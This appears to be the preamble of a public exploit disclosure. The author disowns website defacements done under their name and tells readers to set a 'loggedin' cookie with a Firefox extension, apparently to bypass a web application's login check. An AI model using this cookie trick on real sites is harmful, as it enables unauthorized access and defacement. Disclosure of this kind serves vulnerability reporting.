# I am releasing this to the public. Vendor was notified. Someone is also illegally defacing 
these websites under MY name, which is a shame because they ripped it from a private discussion 
on g00ns.net. This proof of concept is not to be used to illegally hack websites. I do not condone, 
nor act in this type of activity. I suggest whomever is defacing websites under my name stop, 
since you would gain more notorioty under your own name.

Use firefox&#039;s extension "add n edit cookies" to add these to your cookies so they stick. 
(ie: instead of $_GET[&#039;loggedin&#039;] its $_COOKIE[&#039;loggedin&#039;] which stays with each page)
